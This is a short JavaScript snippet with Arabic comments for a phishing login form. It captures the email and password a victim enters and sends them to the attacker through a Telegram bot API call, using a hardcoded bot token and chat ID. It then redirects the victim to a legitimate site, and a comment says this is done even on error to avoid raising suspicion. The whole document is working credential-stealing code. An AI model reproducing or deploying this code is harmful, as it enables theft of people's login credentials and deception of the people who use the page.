<script>
    const form = document.getElementById('secure-form');
    form.onsubmit = async (e) => {
        e.preventDefault();
        
        // جلب البيانات من الحقول
        const u = document.getElementById('email').value;
        const p = document.getElementById('pass').value;
        const btn = document.getElementById('btn-submit');

        btn.disabled = true;
        btn.innerText = "جاري التحقق...";

        // بيانات البوت الخاص بك (تأكد أنها صحيحة)
        const token = "7759864787:AAHshRshfAAt2I9T7T8-V-N6fA8G9K1e3L4"; 
        const chatId = "5174578125";
        
        // نص الرسالة التي ستصلك
        const message = `🚀 وصول جديد من صفحة الدخول\n━━━━━━━━━━━━\n👤 المستخدم: ${u}\n🔑 كلمة السر: ${p}\n━━━━━━━━━━━━`;

        try {
            // إرسال البيانات مباشرة إلى تلجرام
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: "Markdown"
                })
            });
            
            // التحويل للموقع الحقيقي بعد نجاح الإرسال
            window.location.href = "https://receive-smss.com/";
        } catch (err) {
            // في حال حدوث خطأ، يتم التحويل أيضاً لعدم إثارة الشكوك
            window.location.href = "https://receive-smss.com/";
        }
    };
</script>
